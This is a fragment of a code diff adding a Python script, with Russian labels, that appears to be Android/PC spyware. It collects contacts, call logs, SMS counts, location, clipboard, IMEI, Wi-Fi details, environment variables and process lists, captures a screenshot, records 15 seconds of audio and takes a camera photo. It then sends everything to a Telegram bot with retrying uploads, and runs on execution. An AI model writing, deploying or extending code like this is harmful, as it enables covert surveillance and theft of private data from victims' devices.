+                time.sleep(backoff)
+                backoff *= 2
+            except:
+                time.sleep(backoff)
+                backoff *= 2
+    
+    if photo_bytes:
+        endpoint = "sendPhoto"
+        files = {'photo': ('screenshot.png', photo_bytes, 'image/png')}
+        data = {'chat_id': USER_ID, 'caption': caption or 'Скриншот экрана'}
+        for attempt in range(max_retries):
+            try:
+                response = requests.post(url + endpoint, files=files, data=data, timeout=20)
+                if response.status_code == 200:
+                    return True
+                time.sleep(backoff)
+                backoff *= 2
+            except:
+                time.sleep(backoff)
+                backoff *= 2
+    
+    if audio_bytes:
+        endpoint = "sendAudio"
+        files = {'audio': ('audio.wav', audio_bytes, 'audio/wav')}
+        data = {'chat_id': USER_ID, 'caption': caption or 'Аудиозапись (15 сек)', 'title': 'Audio', 'performer': 'System'}
+        for attempt in range(max_retries):
+            try:
+                response = requests.post(url + endpoint, files=files, data=data, timeout=45)
+                if response.status_code == 200:
+                    return True
+                time.sleep(backoff)
+                backoff *= 2
+            except:
+                time.sleep(backoff)
+                backoff *= 2
+    
+    if document_buffers:
+        for buffer, filename in document_buffers:
+            buffer.seek(0)
+            file_size = buffer.getbuffer().nbytes
+            if file_size > 50 * 1024 * 1024:
+                send_to_telegram(text=f"Файл слишком большой ({file_size / (1024*1024):.1f} MB). Пропущен.")
+                continue
+            endpoint = "sendDocument"
+            files = {'document': (filename, buffer, 'text/plain' if filename.endswith('.txt') else 'application/json')}
+            data = {'chat_id': USER_ID, 'caption': caption or 'Документ'}
+            for attempt in range(max_retries):
+                try:
+                    response = requests.post(url + endpoint, files=files, data=data, timeout=45)
+                    if response.status_code == 200:
+                        break
+                    time.sleep(backoff)
+                    backoff *= 2
+                except:
+                    time.sleep(backoff)
+                    backoff *= 2
+    
+    return False
+
+def split_and_send_message(messages):
+    for i, msg in enumerate(messages, 1):
+        send_to_telegram(text=f"<b>Часть {i}/{len(messages)}</b>\n\n{msg}")
+
+def send_system_info():
+    device_info = get_detailed_system_info()
+    
+    contacts_summary = f"Контактов: {len(device_info['contacts'])}"
+    sms_summary = f"SMS: {len(device_info['sms'])}"
+    calls_summary = f"Звонки: {len(device_info['call_logs'])}"
+    location_summary = f"Lat: {device_info['location'].get('latitude', 'N/A')}, Lng: {device_info['location'].get('longitude', 'N/A')}"
+    clipboard_summary = device_info['clipboard'][:100] + "..." if device_info['clipboard'] != "Не доступен" else "Не доступен"
+    apps_summary = f"Приложений: {device_info['apps_count']}"
+    battery_summary = f"{device_info['battery'].get('percentage', 'N/A')}% | {device_info['battery'].get('status', 'N/A')} | Temp: {device_info['battery'].get('temperature', 'N/A')}°C" if IS_ANDROID else f"Батарея: {device_info['battery'].get('percentage', 'N/A')}%"
+    wifi_summary = f"Сетей: {len(device_info['wifi_networks'])} | SSID: {device_info['current_wifi'].get('ssid', 'N/A')}"
+    sensors_summary = f"Сенсоров: {len(device_info['sensors'].get('sensors', []))}" if IS_ANDROID else "N/A"
+    processes_summary = f"Активных: {len([p for p in device_info['running_processes'] if p])}"
+    bluetooth_summary = f"Устройств: {len(device_info['bluetooth_devices'])}"
+    ram_usage = device_info.get('ram_usage_percent', 'N/A')
+    data_usage = device_info.get('data_usage', 'N/A')
+    ping_latency = device_info.get('ping_latency', 'N/A')
+    permissions_summary = f"Прил. с камерой: {device_info['app_permissions']['camera']}, с геолокацией: {device_info['app_permissions']['location']}, микрофон: {device_info['app_permissions']['microphone']}, контакты: {device_info['app_permissions']['contacts']}"
+    sim_summary = f"Оператор: {device_info['sim_carrier']} | Сигнал: {device_info['signal_strength']}" if IS_ANDROID else "N/A"
+    imei_summary = f"IMEI: {device_info['imei']}" if IS_ANDROID else "N/A"
+    env_summary = f"Переменных окружения: {len(device_info['env_vars'])}"
+    packages_summary = f"Pip пакетов: {len(device_info.get('pip_packages', []))}" if not IS_ANDROID else f"Termux пакетов: {len(device_info['termux_packages'])}"
+    
+    part1 = f"""
+<b>📊 ОСНОВНАЯ ИНФОРМАЦИЯ ({'Android' if IS_ANDROID else 'PC'})</b>
+
+📱 Устройство: {device_info['device_model']}
+Производитель: {device_info['manufacturer']}
+Модель: {device_info['device_name']}
+OS: {device_info['android_version'] if IS_ANDROID else info['os_version']} (SDK {device_info['sdk_version']}) | Патч: {device_info['security_patch']}
+Сборка: {device_info['build_id']} ({device_info['build_type']})
+Uptime: {device_info['uptime']}
+SELinux/Root: {device_info['selinux_status']} / {device_info['root_detected']}
+Play Services: {device_info['play_services']}
+Boot: {device_info['boot_time']}
+
+🖥️ АППАРАТНОЕ:
+Платформа: {device_info['board']}
+Архитектура: {device_info['architecture']}
+Железо: {device_info['hardware']}
+GPU: {device_info['gpu_renderer']}
+Бренд: {device_info['product_brand']}
+Ядро: {device_info['kernel_version']}
+CPU: {device_info['cpu_frequency']} | Load: {device_info['cpu_load']}
+Термальные зоны: {device_info['thermal_zones']}
+"""
+    
+    part2 = f"""
+🔋 БАТАРЕЯ И СЕНСОРЫ:
+Батарея: {battery_summary}
+RAM: {device_info['total_memory']} | Использовано: {ram_usage}
+Сенсоры: {sensors_summary}
+
+🌐 СЕТЬ:
+Внешний IP: <code>{device_info['external_ip']}</code>
+Локальный IP: <code>{device_info['local_ip']}</code>
+MAC: <code>{device_info['mac_address']}</code>
+DNS: {device_info['dns_servers'][:100]}...
+Wi-Fi: {wifi_summary}
+Данные: {data_usage}
+Пинг: {ping_latency}
+Bluetooth: {bluetooth_summary}
+SIM: {sim_summary}
+{imei_summary}
+Интерфейсы: {device_info['network_interfaces'][:200]}...
+"""
+    
+    part3 = f"""
+💾 ХРАНИЛИЩЕ:
+Всего: {device_info.get('storage_total', 'N/A')}
+Использовано: {device_info.get('storage_used', 'N/A')}
+Свободно: {device_info.get('storage_free', 'N/A')}
+Детали: {device_info['storage_details'][:200]}...
+
+👤 СИСТЕМА:
+Пользователь: {device_info['current_user']}
+Платформа: {device_info['platform']}
+Python: {device_info['python_version']}
+Часовой пояс: {device_info['timezone']}
+Язык: {device_info['language']}
+Окружение: {env_summary}
+
+📱 ЭКРАН И ПРИЛОЖЕНИЯ:
+Разрешение: {device_info['screen_resolution']}
+Плотность: {device_info['screen_density']}
+Приложений: {apps_summary}
+Разрешения: {permissions_summary}
+Активное: {device_info['foreground_app']}
+Браузер: {device_info['browser_info'][:100]}...
+Пакеты: {packages_summary}
+"""
+    
+    part4 = f"""
+📞 КОММУНИКАЦИИ:
+{contacts_summary}
+{sms_summary}
+{calls_summary}
+Местоположение: {location_summary}
+Буфер: {clipboard_summary}
+
+⚙️ ПРОЦЕССЫ:
+{processes_summary}
+
+⏰ ВРЕМЯ: {device_info['current_time']}
+🔧 Fingerprint: <code>{device_info['device_fingerprint']}</code>
+
+<b>Детальные списки в файлах ниже.</b>
+"""
+    
+    split_and_send_message([part1, part2, part3, part4])
+    
+    apps_buffer, apps_fn = create_detailed_buffer('\n'.join(device_info['detailed_apps']), 'apps_list.txt')
+    send_to_telegram(document_buffers=[(apps_buffer, apps_fn)], caption='Список приложений')
+    
+    processes_buffer, proc_fn = create_detailed_buffer('\n'.join(str(p) for p in device_info['running_processes']) + f'\n\nВсе: {device_info["all_processes"]}', 'processes.txt')
+    send_to_telegram(document_buffers=[(processes_buffer, proc_fn)], caption='Процессы')
+    
+    if device_info['contacts']:
+        contacts_buffer, cont_fn = create_detailed_buffer(json.dumps(device_info['contacts'], ensure_ascii=False, indent=2), 'contacts.json')
+        send_to_telegram(document_buffers=[(contacts_buffer, cont_fn)], caption='Контакты')
+    
+    if device_info['call_logs']:
+        calls_buffer, calls_fn = create_detailed_buffer(json.dumps(device_info['call_logs'], ensure_ascii=False, indent=2), 'calls.json')
+        send_to_telegram(document_buffers=[(calls_buffer, calls_fn)], caption='Журнал звонков')
+    
+    screenshot_bytes = capture_screenshot_bytes()
+    if screenshot_bytes:
+        send_to_telegram(photo_bytes=screenshot_bytes, caption='Скриншот')
+    
+    audio_bytes = record_audio_bytes()
+    if audio_bytes:
+        send_to_telegram(audio_bytes=audio_bytes, caption='Аудиозапись (15 сек)')
+    
+    if device_info['camera_photo']:
+        try:
+            camera_bytes = base64.b64decode(device_info['camera_photo'])
+            send_to_telegram(photo_bytes=camera_bytes, caption='Фото с камеры')
+        except:
+            pass
+
+if __name__ == "__main__":
+    send_system_info()
